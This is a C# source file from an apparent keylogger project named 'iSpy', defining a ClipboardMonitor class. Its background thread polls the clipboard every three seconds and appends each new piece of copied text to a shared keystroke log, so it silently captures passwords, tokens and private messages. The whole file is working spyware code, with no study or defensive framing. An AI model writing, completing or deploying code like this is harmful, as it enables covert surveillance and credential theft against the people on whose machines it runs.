using System;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using System.Windows.Forms;
namespace iSpy
{
    public class ClipboardMonitor
    {
        private static string currentData = string.Empty;
        private static string previousData = string.Empty;
        public static void Start()
        {
            Thread t = new Thread(new ThreadStart(Monitor));
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
        }
        private static void Monitor()
        {
            while (true)
            {
                if (Clipboard.ContainsText())
                {
                    currentData = Clipboard.GetText();
                    if (!currentData.Equals(previousData))
                    {
                        Keylogger.recordedKeystrokes += "\r\n\r\n[CLIPBOARD]\r\n" + currentData + "\r\n[/CLIPBOARD]\r\n";
                    }
                    previousData = currentData;
                }
                Thread.Sleep(3000);
            }
        }
    }  
}
